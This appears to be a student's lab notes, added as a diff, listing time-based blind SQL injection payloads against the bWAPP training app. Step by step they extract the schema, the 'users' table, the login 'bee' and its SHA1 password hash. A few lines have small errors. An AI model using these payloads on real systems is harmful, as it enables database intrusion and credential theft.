@@ -1,0 +1,124 @@
+ 6) SQL 인젝션
+
+ ① 
+
+' or length(database()) = 5 and sleep(1) #
+
+
+ ② 
+
+' or substring(database(),1,1) = 'b' and sleep(1) #
+' or substring(database(),2,1) = 'W' and sleep(1) #
+' or substring(database(),3,1) = 'A' and sleep(1) #
+' or substring(database(),4,1) = 'P' and sleep(1) #
+' or substring(database(),5,1) = 'P' and sleep(1) #
+' or database() = 'bWAPP' and sleep(1) #
+
+
+ ③ 
+
+' or length((select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1)) = 1 and sleep(1) #
+' or length((select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1)) = 2 and sleep(1) #
+' or length((select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1)) = 3 and sleep(1) #
+' or length((select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1)) = 4 and sleep(1) #
+' or length((select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1)) = 5 and sleep(1) #
+
+
+ ④ 
+
+or substring((select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1), 1,1) = 'u' and sleep(1) #
+' or substring((select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1), 2,1) = 's' and sleep(1) #
+' or substring((select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1), 3,1) = 'e' and sleep(1) #
+' or substring((select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1), 4,1) = 'r' and sleep(1) #
+' or substring((select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1), 5,1) = 's' and sleep(1) #
+' or (select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1) = 'users' and sleep(1) #
+
+
+ ⑤ 
+
+' or length((select column_name from information_schema.columns where table_name='users' limit 0,1)) = 1 and sleep(1) #
+' or length((select column_name from information_schema.columns where table_name='users' limit 0,1)) = 2 and sleep(1) #
+
+
+ ⑥ 
+
+' or substring((select column_name from information_schema.columns where table_name='users' limit 0,1), 1,1) = 'i' and sleep(1) #
+' or substring((select column_name from information_schema.columns where table_name='users' limit 0,1), 2,1) = 'd' and sleep(1) #
+' or (select column_name from information_schema.columns where table_name='users' limit 0,1) = 'id' and sleep(1) #
+
+
+ ⑦ 
+
+' or length((select column_name from information_schema.columns where table_name='users' limit 1,1)) = 1 and sleep(1) #
+' or length((select column_name from information_schema.columns where table_name='users' limit 1,1)) = 2 and sleep(1) #
+' or length((select column_name from information_schema.columns where table_name='users' limit 1,1)) = 3 and sleep(1) #
+' or length((select column_name from information_schema.columns where table_name='users' limit 1,1)) = 4 and sleep(1) #
+' or length((select column_name from information_schema.columns where table_name='users' limit 1,1)) = 5 and sleep(1) #
+
+
+ ⑧ 
+
+' or substring((select column_name from information_schema.columns where table_name='users' limit 1,1), 1,1) = 'l' and sleep(1) #
+' or substring((select column_name from information_schema.columns where table_name='users' limit 1,1), 2,1) = 'o' and sleep(1) #
+' or substring((select column_name from information_schema.columns where table_name='users' limit 1,1), 3,1) = 'g' and sleep(1) #
+' or substring((select column_name from information_schema.columns where table_name='users' limit 1,1), 4,1) = 'i' and sleep(1) #
+' or substring((select column_name from information_schema.columns where table_name='users' limit 1,1), 5,1) = 'n' and sleep(1) #
+' or (select column_name from information_schema.columns where table_name='users' limit 1,1) = 'login' and sleep(1) #
+
+
+ ⑨ 
+
+' or length((select column_name from information_schema.columns where table_name='users' limit 2,1)) = 1 and sleep(1) #
+' or length((select column_name from information_schema.columns where table_name='users' limit 2,1)) = 2 and sleep(1) #
+' or length((select column_name from information_schema.columns where table_name='users' limit 2,1)) = 3 and sleep(1) #
+' or length((select column_name from information_schema.columns where table_name='users' limit 2,1)) = 4 and sleep(1) #
+' or length((select column_name from information_schema.columns where table_name='users' limit 2,1)) = 5 and sleep(1) #
+' or length((select column_name from information_schema.columns where table_name='users' limit 2,1)) = 6 and sleep(1) #
+' or length((select column_name from information_schema.columns where table_name='users' limit 2,1)) = 7 and sleep(1) #
+' or length((select column_name from information_schema.columns where table_name='users' limit 2,1)) = 8 and sleep(1) #
+
+
+ ⑩ 
+
+' or substring((select column_name from information_schema.columns where table_name='users' limit 2,1), 1,1) = 'p' and sleep(1) #
+' or substring((select column_name from information_schema.columns where table_name='users' limit 2,1), 2,1) = 'a' and sleep(1) #
+' or substring((select column_name from information_schema.columns where table_name='users' limit 2,1), 3,1) = 's' and sleep(1) #
+' or substring((select column_name from information_schema.columns where table_name='users' limit 2,1), 4,1) = 's' and sleep(1) #
+' or substring((select column_name from information_schema.columns where table_name='users' limit 2,1), 5,1) = 'w' and sleep(1) #
+' or substring((select column_name from information_schema.columns where table_name='users' limit 2,1), 5,1) = 'o' and sleep(1) #
+' or substring((select column_name from information_schema.columns where table_name='users' limit 2,1), 5,1) = 'r' and sleep(1) #
+' or substring((select column_name from information_schema.columns where table_name='users' limit 2,1), 5,1) = 'd' and sleep(1) #
+' or (select column_name from information_schema.columns where table_name='users' limit 2,1) = 'password' and sleep(1) #
+
+
+ ⑪ 
+
+' or length((select login from users limit 1,1)) = 1 and sleep(1) #
+' or length((select login from users limit 1,1)) = 2 and sleep(1) #
+' or length((select login from users limit 1,1)) = 3 and sleep(1) #
+
+
+ ⑫ 
+
+' or substring((select login from users limit 1,1), 1,1) = 'b' and sleep(1) #
+' or substring((select login from users limit 1,1), 2,1) = 'e' and sleep(1) #
+' or substring((select login from users limit 1,1), 3,1) = 'e' and sleep(1) #
+' or (select login from users limit 1,1) = 'bee' and sleep(1) #
+
+
+ ⑬ 
+
+' or length((select password from users where login='bee')) = 20 and sleep(1) #
+' or length((select password from users where login='bee')) = 40 and sleep(1) #
+
+
+ ⑭ 
+
+' or substring((select password from users where login='bee'), 1,1) >= '6' and sleep(1) #
+' or substring((select password from users where login='bee'), 1,1) > '7' and sleep(1) #
+
+' or (select password from users where login='bee') = '6885858486f31043e5839c735d99457f045affd0' and sleep(1) #
+
+' or md5("bug") = (select password from users where login='bee') and sleep(1) #
+' or sha1("bug") = (select password from users where login='bee') and sleep(1) #
+
